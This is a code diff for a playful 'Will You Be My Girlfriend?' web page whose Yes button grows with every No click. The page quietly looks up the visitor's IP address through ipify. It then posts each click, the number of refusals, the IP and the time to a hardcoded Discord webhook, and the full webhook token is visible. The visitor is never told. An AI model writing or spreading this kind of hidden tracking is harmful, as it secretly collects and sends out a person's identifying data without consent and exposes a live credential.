@@ -5,13 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Will You Be My Girlfriend?</title>
     <style>
-        /* CSS stays the same as before */
         body { display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #ffe4e1; font-family: sans-serif; text-align: center; overflow: hidden; }
-        .container { padding: 20px; background: white; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 90%; }
-        h1 { color: #d63384; }
+        .container { padding: 20px; background: white; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 90%; transition: all 0.3s ease; }
+        h1 { color: #d63384; font-size: 1.8rem; }
         .buttons { display: flex; justify-content: center; align-items: center; gap: 20px; flex-wrap: wrap; margin-top: 20px; }
-        #yesBtn { background-color: #4caf50; color: white; border: none; padding: 15px 30px; font-size: 1.2rem; border-radius: 10px; cursor: pointer; }
+        #yesBtn { background-color: #4caf50; color: white; border: none; padding: 15px 30px; font-size: 1.2rem; border-radius: 10px; cursor: pointer; transition: 0.2s; }
         #noBtn { background-color: #f44336; color: white; border: none; padding: 15px 30px; font-size: 1.2rem; border-radius: 10px; cursor: pointer; }
+        #message { margin-top: 15px; color: #d63384; font-weight: bold; min-height: 24px; }
         .success-screen { display: none; }
     </style>
 </head>
@@ -25,9 +25,11 @@
                 <button id="yesBtn">Yes</button>
                 <button id="noBtn">No</button>
             </div>
+            <p id="message"></p>
         </div>
 
         <div id="successArea" class="success-screen">
+            <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExbnZ3Z3R4ZnR6eXp4ZnR6eXp4ZnR6eXp4ZnR6eXp4ZnR6ZSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/26FLdmIp6wJr91JAI/giphy.gif" width="150">
             <h1>Yay! Best decision ever! ❤️</h1>
         </div>
     </div>
@@ -36,35 +38,30 @@
         const webhookURL = "https://discord.com/api/webhooks/1487857352869679115/YvduKELscTn-1i6m02Q7m8L357bZvrnFkfl_B_s-Guj8sizPwrLoTvXkrkDW86jYvGxT";
         const yesBtn = document.getElementById('yesBtn');
         const noBtn = document.getElementById('noBtn');
+        const message = document.getElementById('message');
         let noCount = 0;
         let userIP = "Unknown";
 
-        // Get User IP on load
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => userIP = data.ip);
+        const phrases = ["No", "Are you sure?", "Puh-lease? 🥺", "Don't do this!", "I'll be sad...", "Think again!", "I'll buy you snacks!", "PLEASE CUTIE!", "Just click Yes!"];
+
+        fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => userIP = data.ip);
 
         function sendLog(action) {
-            if (!webhookURL.includes("http")) return; // Don't run if URL is missing
-            
-            const payload = {
-                content: `🔔 **Valentine Update!**\n**Action:** ${action}\n**Total No's so far:** ${noCount}\n**IP Address:** ${userIP}\n**Time:** ${new Date().toLocaleString()}`
-            };
-
             fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: JSON.stringify({
+                    content: `🔔 **Proposal Update!**\n**Action:** ${action}\n**Total No's:** ${noCount}\n**IP:** ${userIP}\n**Time:** ${new Date().toLocaleString()}`
+                })
             });
         }
 
         noBtn.addEventListener('click', () => {
             noCount++;
-            let currentSize = 1.2 + (noCount * 0.5);
-            yesBtn.style.fontSize = currentSize + "rem";
+            yesBtn.style.fontSize = (1.2 + noCount * 0.5) + "rem";
             yesBtn.style.padding = (15 + noCount * 5) + "px " + (30 + noCount * 10) + "px";
-            
-            // Optional: send a log every time they click no
+            noBtn.innerText = phrases[Math.min(noCount, phrases.length - 1)];
+            message.innerText = "Wait, look at how big the Yes button is getting!";
             sendLog("Clicked NO ❌");
         });
 
